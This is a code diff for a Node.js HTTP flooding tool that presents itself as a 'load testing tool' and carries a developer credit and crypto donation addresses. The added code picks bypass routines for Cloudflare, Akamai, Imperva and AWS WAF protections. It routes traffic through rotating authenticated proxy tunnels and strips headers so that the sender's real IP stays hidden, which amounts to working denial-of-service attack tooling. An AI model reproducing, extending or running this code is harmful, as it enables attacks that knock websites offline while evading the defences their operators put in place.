@@ -13,9 +13,11 @@ const http2 = require('http2');
 const fs = require('fs');
 const url = require('url');
 const crypto = require('crypto');
+const tunnel = require('tunnel');
 const { program } = require('commander');
 const userAgents = require('./user-agents.js');
 const bypassTechniques = require('./bypass-techniques.js');
+const wafBypassTechniques = require('./waf-bypass.js');
 const networkDetector = require('./network-detector.js');
 const { performance } = require('perf_hooks');
 
@@ -251,7 +253,7 @@ if (options.payload && ['POST', 'PUT', 'PATCH'].includes(options.method.toUpperC
 
 // Parse bypass techniques
 let bypassOptions = options.bypass === 'all' 
-  ? Object.keys(bypassTechniques)
+  ? [...Object.keys(bypassTechniques), ...Object.keys(wafBypassTechniques)]
   : options.bypass.split(',');
 
 // Stats tracking
@@ -288,6 +290,13 @@ if (cluster.isMaster) {
                                                                    
 Advanced Website Load Testing Tool
 For security testing and performance evaluation purposes only
+Developed By Triotion (https://t.me/Triotion)
+---------------------------------------------------------------
+If you find this tool valuable, consider donating to support ongoing development:
+
+BTC: bc1qtkm7dzjp76gx8t9c02pshfd8rzarj6gj9yzglu
+ETH: 0x88Aa0E09a5A62919321f38Fb4782A17f4dc91A9B
+XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
 ---------------------------------------------------------------
 `);
   }
@@ -331,6 +340,7 @@ For security testing and performance evaluation purposes only
             'cloudflareUAMBypass', 
             'cloudflareTurnstileBypass', 
             'cloudflareManagedChallengeBypass',
+            'advancedCloudflareBypass',
             'browserCapabilities',
             'securityTokenEmulation',
             'randomizeHeaderOrder',
@@ -338,6 +348,50 @@ For security testing and performance evaluation purposes only
             'antiMeasurementEvasion'
           ];
           console.log(`[*] Cloudflare detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
+        } else if (detected.includes('Akamai')) {
+          // Akamai detected
+          bypassOptions = [
+            'akamaiBotManagerBypass',
+            'neuralNetworkWafBypass',
+            'tlsFingerprintScrambling',
+            'browserCapabilities',
+            'navigationBehavior',
+            'securityTokenEmulation'
+          ];
+          console.log(`[*] Akamai detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
+        } else if (detected.includes('Imperva') || detected.includes('Incapsula')) {
+          // Imperva detected
+          bypassOptions = [
+            'impervaAdvancedBypass',
+            'neuralNetworkWafBypass',
+            'browserCapabilities',
+            'navigationBehavior',
+            'securityTokenEmulation',
+            'clientHints'
+          ];
+          console.log(`[*] Imperva detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
+        } else if (detected.includes('AWS') || detected.includes('Amazon')) {
+          // AWS WAF detected
+          bypassOptions = [
+            'awsWafShieldBypass',
+            'neuralNetworkWafBypass',
+            'tlsFingerprintScrambling',
+            'browserCapabilities',
+            'securityTokenEmulation'
+          ];
+          console.log(`[*] AWS WAF detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
+        } else {
+          // Generic WAF or unknown protection
+          bypassOptions = [
+            'neuralNetworkWafBypass',
+            'tlsFingerprintScrambling',
+            'randomizeHeaderOrder',
+            'browserCapabilities',
+            'securityTokenEmulation',
+            'navigationBehavior',
+            'clientHints'
+          ];
+          console.log(`[*] Using generic WAF bypass techniques: ${bypassOptions.join(', ')}`);
         }
         
         // Start test after detection
@@ -685,19 +739,76 @@ For security testing and performance evaluation purposes only
             console.error(`Error applying bypass technique ${technique}: ${error.message}`);
           }
         }
+      } else if (wafBypassTechniques[technique]) {
+        try {
+          wafBypassTechniques[technique](requestOptions);
+        } catch (error) {
+          if (options.verbose) {
+            console.error(`Error applying WAF bypass technique ${technique}: ${error.message}`);
+          }
+        }
       }
     });
     
     // Apply proxy if available
     const proxy = options.proxy || getNextProxy();
+    
     if (proxy) {
       const [host, port] = proxy.split(':');
-      requestOptions.agent = new https.Agent({
-        host,
-        port: parseInt(port, 10),
-        rejectUnauthorized: false
-      });
+      
+      // Add proxy auth if provided in the format user:pass@host:port
+      let proxyAuth = null;
+      let proxyHost = host;
+      
+      if (host.includes('@')) {
+        const [auth, hostPart] = host.split('@');
+        proxyAuth = auth;
+        proxyHost = hostPart;
+      }
+      
+      // For HTTP/1.1 requests through proxy
+      if (parsedUrl.protocol === 'https:') {
+        // For HTTPS, use tunnel agent
+        const tunnel = require('tunnel');
+        
+        // Create tunnel agent
+        requestOptions.agent = tunnel.httpsOverHttp({
+          proxy: {
+            host: proxyHost,
+            port: parseInt(port, 10),
+            proxyAuth: proxyAuth
+          }
+        });
+        
+        // Keep original hostname, port and path
+        requestOptions.hostname = parsedUrl.hostname;
+        requestOptions.port = parsedUrl.port || 443;
+        requestOptions.path = requestOptions.path;
+      } else {
+        // For HTTP, use direct proxy
+        requestOptions.hostname = proxyHost;
+        requestOptions.port = parseInt(port, 10);
+        requestOptions.path = parsedUrl.href; // Use full URL for proxy requests
+        
+        // Add proxy auth if present
+        if (proxyAuth) {
+          requestOptions.headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(proxyAuth).toString('base64');
+        }
+      }
+      
+      // Ensure we're not leaking the original IP
+      requestOptions.headers['Proxy-Connection'] = 'Keep-Alive';
+      
+      // Remove any headers that might reveal original IP
+      delete requestOptions.headers['X-Forwarded-For'];
+      delete requestOptions.headers['X-Real-IP'];
+      delete requestOptions.headers['X-Client-IP'];
     }
+    
+    // Count request size (headers + URL)
+    const headerSize = Buffer.from(JSON.stringify(requestOptions.headers)).length;
+    const urlSize = Buffer.from(requestOptions.path).length;
+    workerStats.bytesSent += headerSize + urlSize;
     
     return requestOptions;
   }
@@ -707,136 +818,348 @@ For security testing and performance evaluation purposes only
     const requestStart = performance.now();
     const requestOptions = createRequestOptions();
     
+    // Get the proxy to use for this request
+    const proxyToUse = options.proxy || getNextProxy();
+    
     try {
+      // Parse the URL
+      const parsedUrl = new URL(options.target);
+      
       if (options.protocol === 'http2') {
         // HTTP/2 request implementation
-        const client = http2.connect(`https://${requestOptions.hostname}:${requestOptions.port}`, {
-          rejectUnauthorized: false,
-          settings: {
-            enablePush: false,
-            initialWindowSize: 1024 * 1024, // 1MB
-            maxSessionMemory: 64 * 1024 * 1024 // 64MB
-          }
-        });
-        
-        client.on('error', (err) => {
-          workerStats.failed++;
-          workerStats.requests++;
-          client.close();
-        });
-        
-        const headers = {
-          ':method': requestOptions.method,
-          ':path': requestOptions.path,
-          ':scheme': 'https',
-          ':authority': requestOptions.hostname
-        };
-        
-        // Add all HTTP/2 compatible headers
-        for (const [key, value] of Object.entries(requestOptions.headers)) {
-          // Skip HTTP/1.x specific headers
-          if (!['host', 'connection', 'keep-alive', 'transfer-encoding', 'upgrade'].includes(key.toLowerCase())) {
-            headers[key.toLowerCase()] = value;
-          }
-        }
-        
-        const req = client.request(headers);
-        
-        let responseData = Buffer.alloc(0);
-        let statusCode = null;
-        
-        req.on('response', (headers) => {
-          statusCode = headers[':status'];
-          workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
-        });
-        
-        req.on('data', (chunk) => {
-          responseData = Buffer.concat([responseData, chunk]);
-          workerStats.bytesReceived += chunk.length;
-        });
-        
-        req.on('end', () => {
-          const requestEnd = performance.now();
-          
-          if (statusCode) {
-            if (statusCode >= 200 && statusCode < 400) {
-              workerStats.successful++;
-            } else {
-              workerStats.failed++;
+        try {
+          const h2Options = {
+            rejectUnauthorized: false,
+            settings: {
+              enablePush: false,
+              initialWindowSize: 1024 * 1024, // 1MB
+              maxSessionMemory: 64 * 1024 * 1024 // 64MB
             }
-          } else {
-            workerStats.failed++;
-          }
+          };
           
-          workerStats.requests++;
-          client.close();
-        });
-        
-        req.on('error', () => {
+          // Parse the URL to get the correct authority
+          const authority = `${parsedUrl.hostname}${parsedUrl.port ? `:${parsedUrl.port}` : ''}`;
+          
+          // Handle proxy for HTTP/2 if needed
+          let client;
+          if (proxyToUse) {
+            // Extract proxy parts
+            const [proxyHost, proxyPort] = proxyToUse.split(':');
+            
+            // Extract auth if provided
+            let proxyAuthValue = null;
+            let actualProxyHost = proxyHost;
+            
+            if (proxyHost.includes('@')) {
+              const [auth, host] = proxyHost.split('@');
+              proxyAuthValue = auth;
+              actualProxyHost = host;
+            }
+            
+            // Create a tunnel first for HTTP/2 over proxy
+            const tunnelAgent = tunnel.httpsOverHttp({
+              proxy: {
+                host: actualProxyHost,
+                port: parseInt(proxyPort, 10),
+                proxyAuth: proxyAuthValue
+              }
+            });
+            
+            // Connect using the tunnel
+            const socket = tunnelAgent.createConnection({
+              host: parsedUrl.hostname,
+              port: parsedUrl.port || 443,
+              servername: parsedUrl.hostname
+            });
+            
+            // Once the socket is ready, connect HTTP/2 over it
+            socket.on('connect', () => {
+              try {
+                const clientOptions = {
+                  ...h2Options,
+                  socket: socket // Use the established tunnel
+                };
+                
+                client = http2.connect(`https://${authority}`, clientOptions);
+                
+                // Continue with the HTTP/2 request over the tunnel
+                sendHttp2Request(client, requestOptions, authority);
+              } catch (e) {
+                workerStats.failed++;
+                workerStats.requests++;
+                socket.destroy();
+              }
+            });
+            
+            socket.on('error', (err) => {
+              workerStats.failed++;
+              workerStats.requests++;
+              if (options.verbose) {
+                console.error(`Proxy tunnel error: ${err.message}`);
+              }
+            });
+            
+            // Return early since the request will be sent once the tunnel is established
+            return;
+          } else {
+            // Direct HTTP/2 connection (no proxy)
+            client = http2.connect(`https://${authority}`, h2Options);
+            
+            // Send the HTTP/2 request directly
+            sendHttp2Request(client, requestOptions, authority);
+          }
+        } catch (error) {
           workerStats.failed++;
           workerStats.requests++;
-          client.close();
-        });
-        
-        // Send payload if applicable
-        if (['POST', 'PUT', 'PATCH'].includes(requestOptions.method) && payloadData) {
-          const buffer = Buffer.from(payloadData);
-          workerStats.bytesSent += buffer.length;
-          req.write(buffer);
+          if (options.verbose) {
+            console.error(`HTTP/2 error: ${error.message}`);
+          }
         }
-        
-        req.end();
       } else {
         // HTTP/1.1 request
-        const protocol = new URL(options.target).protocol === 'https:' ? https : http;
-        
-        const request = protocol.request(requestOptions, (response) => {
-          const { statusCode } = response;
-          workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
+        try {
+          const protocol = parsedUrl.protocol === 'https:' ? https : http;
           
-          let responseSize = 0;
-          
-          response.on('data', (chunk) => {
-            responseSize += chunk.length;
-            workerStats.bytesReceived += chunk.length;
-          });
-          
-          response.on('end', () => {
-            const requestEnd = performance.now();
+          // Handle proxy for HTTP/1.1
+          if (proxyToUse) {
+            // Extract proxy parts
+            const [proxyHost, proxyPort] = proxyToUse.split(':');
             
-            if (statusCode >= 200 && statusCode < 400) {
-              workerStats.successful++;
-            } else {
-              workerStats.failed++;
+            // Extract auth if provided
+            let proxyAuthValue = null;
+            let actualProxyHost = proxyHost;
+            
+            if (proxyHost.includes('@')) {
+              const [auth, host] = proxyHost.split('@');
+              proxyAuthValue = auth;
+              actualProxyHost = host;
             }
             
+            // Create appropriate tunnel agent
+            if (parsedUrl.protocol === 'https:') {
+              // For HTTPS requests through HTTP proxy
+              requestOptions.agent = tunnel.httpsOverHttp({
+                proxy: {
+                  host: actualProxyHost,
+                  port: parseInt(proxyPort, 10),
+                  proxyAuth: proxyAuthValue
+                },
+                rejectUnauthorized: false
+              });
+            } else {
+              // For HTTP requests through HTTP proxy
+              requestOptions.agent = tunnel.httpOverHttp({
+                proxy: {
+                  host: actualProxyHost,
+                  port: parseInt(proxyPort, 10),
+                  proxyAuth: proxyAuthValue
+                }
+              });
+            }
+            
+            // Make sure we're using the target hostname, not the proxy's
+            requestOptions.hostname = parsedUrl.hostname;
+            requestOptions.port = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80);
+            requestOptions.headers['Host'] = parsedUrl.hostname;
+          }
+          
+          // Send HTTP/1.1 request
+          const request = protocol.request(requestOptions, (response) => {
+            // Handle redirects if enabled
+            if (options.followRedirects && (response.statusCode === 301 || response.statusCode === 302 || response.statusCode === 307 || response.statusCode === 308)) {
+              const location = response.headers.location;
+              if (location) {
+                // Create a new request to the redirect location
+                try {
+                  const redirectUrl = new URL(location, options.target);
+                  performRequest(redirectUrl.href);
+                } catch (e) {
+                  // Failed to follow redirect
+                  workerStats.failed++;
+                }
+                // Count the original request
+                workerStats.requests++;
+                return;
+              }
+            }
+            
+            let responseSize = 0;
+            let responseBody = [];
+            
+            response.on('data', (chunk) => {
+              responseSize += chunk.length;
+              workerStats.bytesReceived += chunk.length;
+              responseBody.push(chunk);
+            });
+            
+            response.on('end', () => {
+              const requestEnd = performance.now();
+              
+              if (response.statusCode >= 200 && response.statusCode < 400) {
+                workerStats.successful++;
+              } else {
+                workerStats.failed++;
+              }
+              
+              workerStats.requests++;
+            });
+          });
+          
+          request.on('error', (err) => {
+            workerStats.failed++;
+            workerStats.requests++;
+            if (options.verbose) {
+              console.error(`Error in HTTP/1.1 request: ${err.message}`);
+            }
+          });
+          
+          request.on('timeout', () => {
+            request.destroy();
+            workerStats.failed++;
             workerStats.requests++;
           });
-        });
-        
-        request.on('error', () => {
+          
+          // Send payload if applicable
+          if (['POST', 'PUT', 'PATCH'].includes(options.method)) {
+            // Default to empty payload if none provided
+            let payload = payloadData;
+            if (!payload && options.method !== 'GET') {
+              payload = `data=${Date.now()}`;
+              
+              // Add content-type header if not present
+              if (!requestOptions.headers['Content-Type']) {
+                requestOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+              }
+            }
+            
+            if (payload) {
+              const buffer = Buffer.from(payload);
+              // Count request headers + URL in sent bytes
+              const headerStr = Object.entries(requestOptions.headers)
+                .map(([key, value]) => `${key}: ${value}`)
+                .join('\r\n');
+              const requestLine = `${options.method} ${requestOptions.path} HTTP/1.1\r\n`;
+              const headerSize = Buffer.from(headerStr + '\r\n\r\n').length;
+              const requestLineSize = Buffer.from(requestLine).length;
+              workerStats.bytesSent += headerSize + requestLineSize + buffer.length;
+              request.write(buffer);
+            }
+          }
+          
+          request.end();
+        } catch (error) {
           workerStats.failed++;
           workerStats.requests++;
-        });
-        
-        request.on('timeout', () => {
-          request.destroy();
-          workerStats.failed++;
-          workerStats.requests++;
-        });
-        
-        // Send payload if applicable
-        if (['POST', 'PUT', 'PATCH'].includes(options.method) && payloadData) {
-          const buffer = Buffer.from(payloadData);
-          workerStats.bytesSent += buffer.length;
-          request.write(buffer);
+          if (options.verbose) {
+            console.error(`HTTP/1.1 error: ${error.message}`);
+          }
         }
-        
-        request.end();
       }
     } catch (error) {
       workerStats.failed++;
       workerStats.requests++;
+      if (options.verbose) {
+        console.error(`Request error: ${error.message}`);
+      }
     }
+  }
+  
+  // Helper function for sending HTTP/2 requests
+  function sendHttp2Request(client, requestOptions, authority) {
+    client.on('error', (err) => {
+      workerStats.failed++;
+      workerStats.requests++;
+      try {
+        client.close();
+      } catch (e) {
+        // Ignore close errors
+      }
+    });
+    
+    const headers = {
+      ':method': requestOptions.method,
+      ':path': requestOptions.path,
+      ':scheme': 'https',
+      ':authority': authority
+    };
+    
+    // Add all HTTP/2 compatible headers
+    for (const [key, value] of Object.entries(requestOptions.headers)) {
+      // Skip HTTP/1.x specific headers and HTTP/2 pseudo-headers
+      if (!['host', 'connection', 'keep-alive', 'transfer-encoding', 'upgrade', 'proxy-connection'].includes(key.toLowerCase()) &&
+          !key.startsWith(':')) {
+        headers[key.toLowerCase()] = value;
+      }
+    }
+    
+    // Add content-type header for POST/PUT requests
+    if (['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
+      if (!headers['content-type']) {
+        headers['content-type'] = 'application/x-www-form-urlencoded';
+      }
+    }
+    
+    const req = client.request(headers);
+    
+    let responseData = Buffer.alloc(0);
+    let statusCode = null;
+    
+    req.on('response', (headers) => {
+      statusCode = headers[':status'];
+      workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
+    });
+    
+    req.on('data', (chunk) => {
+      responseData = Buffer.concat([responseData, chunk]);
+      workerStats.bytesReceived += chunk.length;
+    });
+    
+    req.on('end', () => {
+      const requestEnd = performance.now();
+      
+      if (statusCode) {
+        if (statusCode >= 200 && statusCode < 400) {
+          workerStats.successful++;
+        } else {
+          workerStats.failed++;
+        }
+      } else {
+        workerStats.failed++;
+      }
+      
+      workerStats.requests++;
+      try {
+        client.close();
+      } catch (e) {
+        // Ignore close errors
+      }
+    });
+    
+    req.on('error', () => {
+      workerStats.failed++;
+      workerStats.requests++;
+      try {
+        client.close();
+      } catch (e) {
+        // Ignore close errors
+      }
+    });
+    
+    // Send payload if applicable
+    if (['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
+      // Default to empty payload if none provided
+      let payload = payloadData;
+      if (!payload && requestOptions.method !== 'GET') {
+        payload = `data=${Date.now()}`;
+      }
+      
+      if (payload) {
+        const buffer = Buffer.from(payload);
+        workerStats.bytesSent += buffer.length;
+        req.write(buffer);
+      }
+    }
+    
+    req.end();
   }
 }
